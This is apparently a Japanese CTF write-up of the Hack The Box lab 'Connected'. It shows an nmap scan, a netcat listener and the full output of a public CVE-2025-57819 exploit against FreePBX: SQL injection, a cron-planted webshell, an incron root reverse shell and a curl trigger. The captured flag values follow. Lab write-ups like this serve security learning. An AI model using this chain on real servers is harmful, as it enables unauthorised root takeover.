+++
author = "Hugo Authors"
title = "HTB Connected"
date = "2026-07-19"
description = ""
tags = [
    "HTB",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png"
draft = true
+++

HTB Connectedのメモ．
<!--more-->

## User Flag

```
$ nmap -Pn -T4 -sV -sC -A 10.129.53.105
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 19:48 +0900
Nmap scan report for connected.htb (10.129.53.105)
Host is up (0.24s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-title: 404 Not Found
|_Requested resource was config.php
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 5.14 - 6.8 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   243.61 ms 10.10.14.1
2   243.85 ms connected.htb (10.129.53.105)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.78 seconds 
```

Webサイトがあるので，以下を追加してアクセス．

```
$ sudo vi /etc/hosts
10.129.53.105     connected.htb
```

`http://10.129.53.105/`へアクセスすると，FreePBXが使用されていることがわかる．

バージョンは `FreePBX 16.0.40.7` である．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/htb-connected/im01.png)


このバージョンには CVE-2025-57819 のRCEの脆弱性がある．

https://github.com/ozcanpng/CVE-2025-57819-FreePBX-RCE2Root のPoCコードを使用する．

初めに，netcatで待ち受ける．

```
$ nc -lvvp 4444
```

次に，PoCコードを実行する．
```
$ python3 exploit.py connected.htb 10.10.15.202 4444
                                                                                                                                                                                                     
       u.        ..                             u.    u.    .d``            u.    u.               
 ...ue888b     .@88i         .         u      x@88k u@88c.  @8Ne.   .u    x@88k u@88c.      uL     
 888R Y888r   ""%888>   .udR88N     us888u.  ^"8888""8888"  %8888:u@88N  ^"8888""8888"  .ue888Nc.. 
 888R I888>     '88%   <888'888k .@88 "8888"   8888  888R    `888I  888.   8888  888R  d88E`"888E` 
 888R I888>   ..dILr~` 9888 'Y"  9888  9888    8888  888R     888I  888I   8888  888R  888E  888E  
 888R I888>  '".-%88b  9888      9888  9888    8888  888R     888I  888I   8888  888R  888E  888E  
u8888cJ888    @  '888k 9888      9888  9888    8888  888R   uW888L  888'   8888  888R  888E  888E  
 "*888*P"    8F   8888 ?8888u../ 9888  9888   "*88*" 8888" '*88888Nu88P   "*88*" 8888" 888& .888E  
   'Y"      '8    8888  "8888P'  "888*""888"    ""   'Y"   ~ '88888F`       ""   'Y"   *888" 888&  
            '8    888F    "P'     ^Y"   ^Y'                   888 ^                     `"   "888E 
             %k  <88F                                         *8E                      .dWi   `88E 
              "+:*%`                                          '8>                      4888~  J8%  
                                                               "                        ^"===*"`   
                                    
ozcanpng security researcher
CVE-2025-57819 PoC
https://github.com/ozcanpng



FreePBX CVE-2025-57819 - Full Chain PoC
Unauthenticated SQLi -> RCE -> Root Shell

  Target : http://connected.htb
  LHOST  : 10.10.15.202:4444
  Shell  : /shell.php
  Author : ozcanpng
  GitHub : https://github.com/ozcanpng

[*] Checking target...
[+] Target is reachable

------------------------------------------------------------
[STEP] Verifying Unauthenticated SQLi
[+] SQLi confirmed.
[+] Database : asterisk
[+] Version  : 5.5.65-MariaDB
[+] DB User  : freepbxuser@localhost

------------------------------------------------------------
[STEP] Inserting Cron Job to Drop Webshell
[+] Cron job inserted successfully
[*] Waiting up to 90s for cron to execute...
[*] Webshell will be at: http://connected.htb/shell.php

------------------------------------------------------------
[STEP] Waiting for Webshell to be Deployed
[*] Attempt 1: Not ready yet... (89s remaining)
[+] Webshell is active! -> uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

------------------------------------------------------------
[STEP] System Recon
    > Current user: uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
    > Hostname: connected
    > Kernel: 5.4.239-1.el7.elrepo.x86_64
    > OS: NAME="Sangoma Linux"
VERSION="7 (Core)"
ID="sangoma"
    > Network: inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
    inet 10.129.53.105/16 brd 10.129.255.255 scope global noprefixroute dynamic eth0
    inet6 fe80::82bd:1bcb:a990:dd3b/64 scope link noprefixroute

------------------------------------------------------------
[STEP] Triggering Root Shell -> 10.10.15.202:4444
[*] Incron payload : eJyLVspIzSmwVkhKLM5Q0M1UsFNT0E9JLdMvSS7QNzTQAyFTPS...
[*] Trigger file   : /var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzSmwVkhKLM5Q0M1UsFNT0E9JLdMvSS7QNzTQAyFTPSMDI30TIFAwsFMzVNJRUCqpyFOKBQDltg8g
[!] START YOUR LISTENER NOW:  nc -lvnp 4444
[!] Make sure your listener is ready before continuing!

Press ENTER when your listener is ready...

[+] Creating trigger file...
[+] Trigger file created -- incron will execute it as root!
[*] Waiting for incron to trigger...
[*] Waiting... 3s
[*] Waiting... 2s
[*] Waiting... 1s
[+] Root shell should be on your listener now!
[*] If no shell arrives, try manually executing:
    curl -k "http://connected.htb/shell.php?cmd=touch%20%27/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzSmwVkhKLM5Q0M1UsFNT0E9JLdMvSS7QNzTQAyFTPSMDI30TIFAwsFMzVNJRUCqpyFOKBQDltg8g%27"

Cleanup webshell and cron job? [y/N]
```

その結果，シェル取が取得できる．

```
$ nc -lvvp 4444

[root@connected /]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@connected root]# cd /home
cd /home
[root@connected home]# ls
ls
asterisk
[root@connected home]# cd asterisk
cd asterisk
[root@connected asterisk]# ls
ls
user.txt
[root@connected asterisk]# cat user.txt
cat user.txt
36fcd6b0f4c533bd9721406830ab2ca6

[root@connected asterisk]# cd /root
cd /root
[root@connected root]# ls
ls
root.txt
[root@connected root]# cat root.txt
cat root.txt
5fb8a65fb309c4a9a40fd2a861c0d1a2
```

## Privilege escalation
権限昇格する必要もなく，すでにroot権限だった．